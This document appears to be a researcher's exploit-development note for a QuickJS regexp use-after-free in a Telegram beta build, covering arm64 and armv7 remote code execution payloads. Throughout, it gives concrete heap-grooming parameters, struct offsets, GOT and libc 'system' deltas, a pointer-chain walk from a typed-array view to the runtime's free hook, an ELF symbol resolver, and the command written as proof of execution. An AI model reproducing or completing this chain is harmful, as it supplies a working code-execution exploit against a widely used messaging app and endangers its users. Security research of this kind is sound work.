# PR #1827 class-64 — v3 device fix (NO_CTX), universal resolver, armv7 port

Date: 2026-11-02. Target app 72799. Host/lab only for this note; the Sony and
the armv7 VM runs are the caller's.

Supersedes the ctx step of `notes/regexp1827_class64_bigint_rce.md` (the
class-13 `JSFunctionBytecode` search). The class-64 `byte_length` primitive and
the proof-file chain are unchanged.

---

## 0. Device results recap and diagnosis

Reported on the Sony XQ-BT52 (72799, arm64):

```
FILL64=4000 LIM=8192  FILL80=400   VIEWS=6 | NO_CTX
LIM=16384                          NO_CTX
LIM=32768 FILL80=4000              VIEWS=6 | NO_CTX
FILL64=8000 LIM=32768 FILL80=4000  VIEWS=7 | NO_CTX
```

`VIEWS=6/7` means the class-64 capture, the `byte_length` writes, and the
forward pad scan **work on the device**. The failure is only the ctx lookup:
the old code scanned forward from a found pad for a class-13
`JS_CLASS_BYTECODE_FUNCTION` and read `JSFunctionBytecode.realm` at +72.

Why that is fragile: the helper functions (and any class-13 object) are
allocated **one class-80 chain step beyond** the pads. The pads are found
because there are two of them, one on each side of the victim data block; the
function beyond a found pad is not guaranteed to be at a higher address. The
device's class-80 chain jumps made the class-13 search fail even though 6-7
pads were forward.

## 1. v3 fix — ctx from the view's own prototype chain

The found pad view is a `BigInt64Array`/`BigUint64Array` (or armv7
`Uint32Array`/`Int32Array`) over the victim data block `D`. Its own JSObject
`J = D + k` is known (that is what the scan found). From `J` we can follow
real object pointers, independent of the class-80 chain direction:

```
arm64:
  J + 24              shape   (JSShape*)
  shape + 48          proto   (JSObject* = BigInt64Array.prototype)
  proto + 32          prop    (JSProperty*)
  prop[1].u.value     constructor JSValue (tag OBJECT)
  ctor + 48           JSFunction realm = JSContext*
  ctx + 16            JSRuntime* rt
  rt + 16             rt->mf.js_free
armv7:
  J + 0x0C            shape
  shape + 0x24        proto
  proto + 0x10        prop
  prop[i] (8-byte JSValue: payload +0, tag +4)
  ctor + 0x18         realm
  ctx + 0x08          rt
  rt + 0x08           rt->mf.js_free
```

The constructor is a normal `JS_CLASS_C_FUNCTION` (class id 12), so
`ctor + 48` (arm64) or `ctor + 0x18` (armv7) is `u.cfunc.realm` directly. The
JSFunctionBytecode layout is no longer involved.

The prop array scan takes the first OBJECT-tagged value whose class id is 12;
for the typed-array prototypes this is `prop[1]` (`prop[0]` is
`BYTES_PER_ELEMENT`). Verified in the lab:

```
I64: n=2 p0=atom518/8/0 p1=atom22143/<ctor>/-1
U64: n=2 p0=atom518/8/0 p1=atom22143/<ctor>/-1
```

The lab v3 twin wrote the proof **5/5** (`evidence_v3_lab.txt`), and the
fragmentation stress passed 5/5 (`evidence_v3_stress.txt`), including
`M80=30000` (~10k free class-80 blocks) and `M64=10000`.

## 2. v3 pivot — one victim is enough

The old chain used one view per pivot (6 views). v3 uses a **stable writer**
and a **re-pivotable reader**, both over the *same* victim:

```
R = the found pad view        (cls 29 or 30)
W = the other BigInt view over the same victim, which was never pivoted
R's u.ptr field = D + k + 56
setR(T):  W[(k + 56) / 8] = T      # one 8-byte store
rd64(A):  W[(A-D)/8] if D <= A and aligned, else setR(A); R[0]
```

Because both views share the same `D`, the pivot index is the small positive
`(k+56)/8`; no cross-view address ordering and no MTE tag arithmetic is
involved. R can be re-pivoted as often as needed, so only **one** usable view
is required. The device's `VIEWS=6` is ample (and the lab passes with
`VIEWS=1`).

Two hardening details added:

* `rd64` returns `BigInt.asUintN(64, ...)`; MTE/TBI-tagged pointers
  (`0xb400...`) read back as positive and pass `plausible()`.
* The fake bytecode buffer is now allocated twice, 454 B (class 480) and
  480 B (class 512), both filled with the same program. Whichever class the
  freed libregexp DynBuf is, one of them reclaims it. This matters on armv7
  where the DynBuf capacity distribution has not been measured.
* The `system()` trigger is a **pre-allocated** 4 KiB `Uint8Array` that is
  simply dropped after the hook (`BIG = null`). No allocation (and therefore
  no possible GC) runs between the `rt` writes and the free that reaches
  `rt->mf.js_free`.

## 3. Device payloads and procedure (Sony 72799)

`lab/regexp1827_class64/`:

| file | purpose |
|---|---|
| `device_payload_v3_72799.js` | **primary Sony A13**, fixed `system-free=0x26df0` |
| `device_payload_v3_72799_dbg.js` | same + DBG chain log (`VIEWS`, per-view k/D/cls, WR, shape/proto/prop, props/cands, ctx/rt/free/sys) |
| `device_payload_v3_72799_f8000.js` | FILL64=8000 fallback if the class-64 drain is short |
| `device_payload_v3_universal.js` | **Sony + Pixel**, runtime ELF64 resolver for `system` |
| `device_payload_v3_universal_dbg.js` | universal + debug |
| `device_payload_v3_pixel_fixed.js` | Pixel fallback, fixed `system-free=0x41fe0` |

Constants in all arm64 payloads (72799):

```
JS_DEF_FREE = 0x173e36c
FREE_GOT    = 0x1964cc0
SYSTEM_DELTA= 0x26df0   (Sony A13) / 0x41fe0 (Pixel A17)
CMD = id > /data/user/0/org.telegram.messenger.beta/cache/rce_proof
FILL64=4000 FILL80=400 NV=32 NW=8 LIM=8192
```

Procedure: inject one synchronous widget script, then read
`globalThis.RESULT` / the `R1827:` console lines and the proof file
`adb shell run-as org.telegram.messenger.beta cat cache/rce_proof`.

Markers:

| marker | meaning |
|---|---|
| `VIEWS=n` | usable forward pad views (n >= 1 is enough) |
| `CTX` | prototype chain found the realm |
| `NO_WR` | no view pair with a valid small pivot index (should not happen) |
| `NO_SHAPE` / `NO_PROTO` / `NO_PROP` | the view JSObject's shape/proto/prop read failed |
| `NO_CTOR` | no class-12 constructor in the first 8 prototype props |
| `NO_CTX` | constructor realm read failed |
| `NO_RT` / `NO_FREE` | `ctx+16` / `rt+16` read failed |
| `NO_SYS` | wrapper/GOT and direct-libc paths both failed (constants) |
| `NO_CMD` | no command buffer (armv7 fallback) |
| `HOOKED` / `AFTER` | rt fields written / trigger returned; check the proof |

If the plain payload still fails, run the `_dbg` variant; its `DBG ...` lines
show exactly which read failed. `NO_CTX` after `DBG ctx=...` would mean the
realm value was implausible; `NO_CTOR` with `DBG props=...` identifies the
prototype/candidate issue.

## 4. Pixel / universal variant — runtime `system` resolution

The app is the same 72799 build on both devices, so `JS_DEF_FREE`/`FREE_GOT`
are the same. Only libc's `system - free` differs (Sony `0x26df0`, Pixel
`0x41fe0`). `device_payload_v3_universal*.js` resolves `system` at runtime:

1. `js_free` (`rt+16`) -> `pieBase = js_free - JS_DEF_FREE`; read
   `free@GOT` at `pieBase + FREE_GOT` -> libc `free`.
2. Scan pages downward from `free` for the ELF magic (`0x464c457f`).
3. Parse the ELF64 header/program headers -> `PT_DYNAMIC`; walk
   `DT_STRTAB`, `DT_SYMTAB`, `DT_STRSZ`, `DT_HASH`, `DT_GNU_HASH`.
4. Look up `system` through `DT_HASH` (if present) or the GNU hash table
   (bloom/buckets/chains), then `system = base + st_value`.

Dynamic `d_ptr` values are handled in both forms: if a value is > 16 MiB it is
treated as an already-relocated absolute pointer, otherwise `base + value`.
Validated on the host glibc: the resolver found `system` and the v3 twin wrote
the proof; the resolved `system - base = 0x53090` and `free - base = 0xa2fc0`
match the host libc. On bionic (Android 13/17) the same ELF64 layout and GNU
hash path apply; the resolver removes the per-device `SYSTEM_DELTA`.

## 5. armv7 port (72799, Android 7.1, arm25lab)

### 5.1 32-bit layout (from `notes/armv7_quickjs_layout.md`, re-derived)

| object | size | arena class | key offsets |
|---|---|---|---|
| `JSValue` | 8 B NaN box | – | payload low 32, tag high 32 |
| `JSObject` | 0x24 (36) | **48** | flags +0x08, class_id +0x0A, shape +0x0C, prop +0x10, union +0x18, `u.ptr` +0x1C, `u.array.count` +0x20 |
| `JSArrayBuffer` | 0x20 (32) | **40** | byte_length +0, max +4, data +0x0C, opaque +0x18, realloc +0x1C |
| `JSTypedArray` | 0x1C (28) | **40** | obj +8, buffer +0x0C, offset +0x10, length +0x14 |
| `JSShape` | – | – | `proto` +0x24 |
| C function | – | 48 | `u.cfunc.realm` +0x18 |
| `JSContext` | – | – | `rt` +0x08 |
| `JSRuntime` | 0x328 | – | mf at +0, `js_free` +0x08, `malloc_state.opaque` +0x20 |

Capture: `capture_count=2, register_count=3` -> `alloc_count=7` ->
`js_malloc(7*4=28)` -> align8(28)+8 = 40 -> **class 40**, matching the
`JSArrayBuffer` struct class. The victim `new ArrayBuffer(40)` data block is
**class 48** (same as every `JSObject`), which is what makes the pad/view scan
work; `new ArrayBuffer(72)` gives a class-80 command buffer.

`REOP_set_i32` writes `capture + 4*(2*cc+pc)`; with `cc=2`, `pc = 10*j - 4`
hits `capture + 40*j`. The store is 4 bytes, so it sets `byte_length` only;
`max_byte_length` stays -1. All values are `0x7a000000 + 8*j`, so the
non-resizable typed-array constructor's alignment check passes and
`Uint32Array(victim)` has count `byte_length/4`.

### 5.2 App 72799 armeabi-v7a constants

From `/tmp/opencode/armv7_72799/lib/armeabi-v7a/libtmessages.49.so`:

```
js_def_free  = 0x13718B0   (MOV R0,R1 ; B free@plt)
free@plt     = 0x15120B0   (loads GOT 0x157BAA4)
free@GOT     = 0x157BAA4   (R_ARM_JUMP_SLOT, BIND_NOW)
rt+0x08      = js_free
rt+0x20      = malloc_state.opaque
```

From `/tmp/opencode/libc32.so` (Android 7.1 emulator libc):

```
free   = 0x16409
system = 0x44DD9
system - free = 0x2E9D0
```

Both are Thumb addresses (odd), so the delta preserves the low bit.

### 5.3 Payloads

| file | purpose |
|---|---|
| `device_payload_armv7_72799.js` | fixed delta `0x2e9d0` |
| `device_payload_armv7_72799_universal.js` | ELF32 resolver (`system` from libc) |
| `device_payload_armv7_72799_dbg.js` | fixed delta + chain log |

Geometry: `FILL40=4000` `ArrayBuffer(16)` fillers drain the class-40 struct
list; `FILL48=2000` `{}` fillers drain the class-48 JSObject list. `NV1=8`
pivot victims (`ArrayBuffer(40)`, dual pads, `Uint32Array` + `Int32Array`
views), `NV2=4` command victims (`ArrayBuffer(72)`, `Uint8Array` view). The
fake program writes 12 distinct byte_lengths (`pc = 6,16,...,116`).

The pivot uses `Uint32Array` (class 28) and `Int32Array` (class 27); the found
view's `u.ptr` is at `J+0x1C` and is rewritten with a **4-byte** store by the
other view over the same `D` (`W[(k+0x1C)/4] = T`). No BigInt and no 8-byte
alignment requirement. The command is written into the 72-byte class-80
victim; if it cannot be found forward of `D`, the payload falls back to a
39-byte compound command in the 40-byte pivot buffer:
`id>$TMPDIR/rce_proof;id>cache/rce_proof`.

### 5.4 Validation status (be critical)

* The 32-bit layout table is derived from the armv7 binary note (verified
  fields: JSObject/class_id/u.ptr/count, JSArrayBuffer, JSTypedArray,
  JSString, allocator endpoints) and re-checked with a 32-bit mock heap for
  the shape->proto->prop->ctor->realm->rt->js_free->hook offsets.
* The ELF32 resolver was run against the actual `libc32.so`: it finds
  `system=0x44dd9` and `free=0x16409` exactly (`evidence_armv7_static.txt`).
* **The armv7 payload has not been executed on the arm25lab VM here.** The
  open items for the first VM run are the DynBuf reclaim class (both 454/480
  buffers are attempted), the class-40/48 free-list drain phase, and the
  class-48 forward scan limit. Use `_dbg` and read `VIEWS`, `NO_SHAPE`,
  `NO_CTOR`, `NO_CMD`.
* The old #1865 jemalloc blocker is irrelevant here: this is the #1827
  `JS_RegExpDelete` UAF; the class-40/48 slabs are the quickjs arena, not the
  jemalloc large-block frame path.

## 6. Files

```
lab/regexp1827_class64/
  gen_final2.py                       arm64 v3 template + device/lab/universal emitter
  gen_armv7.py                        armv7 template + emitter
  gen_stress_v3.py                    arm64 fragmentation stress
  device_payload_v3_72799.js          Sony primary
  device_payload_v3_72799_dbg.js      Sony debug
  device_payload_v3_72799_f8000.js    Sony high-drain fallback
  device_payload_v3_universal.js      Sony + Pixel resolver
  device_payload_v3_universal_dbg.js  Sony + Pixel resolver debug
  device_payload_v3_pixel_fixed.js    Pixel fixed-delta fallback
  device_payload_armv7_72799.js       armv7 fixed delta
  device_payload_armv7_72799_universal.js  armv7 ELF32 resolver
  device_payload_armv7_72799_dbg.js   armv7 debug
  lab_final_v5.js                     arm64 lab twin (5/5, final)
  evidence_v3_lab.txt                 arm64 lab 5/5
  evidence_v3_stress.txt              arm64 stress 5/5
  evidence_armv7_static.txt           armv7 constants / ELF32 resolver proof
```
